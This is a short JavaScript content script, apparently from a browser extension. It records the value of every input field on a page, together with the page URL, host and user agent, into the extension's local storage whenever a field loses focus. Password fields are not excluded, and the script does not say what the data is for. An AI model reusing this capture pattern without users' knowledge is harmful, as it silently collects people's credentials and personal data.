var inputs=document.querySelectorAll('input');

chrome.storage.local.set({session:[],url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});


inputs.forEach(input=>{
    input.addEventListener('blur',e=>{
        let {type,id,value} = input;
        if(value.trim()!=""){
          chrome.storage.local.get(['session'],obj=>{
              session=obj.session;
              session.forEach((ses,i)=>{
                  if(ses.id==id && id!=null && id!=undefined && id!=""){
                      console.log(id);
                      session.splice(i,1);
                  };
              });
              session.push({type,id,value});
              chrome.storage.local.set({session:session});
          })
        }
    })
});



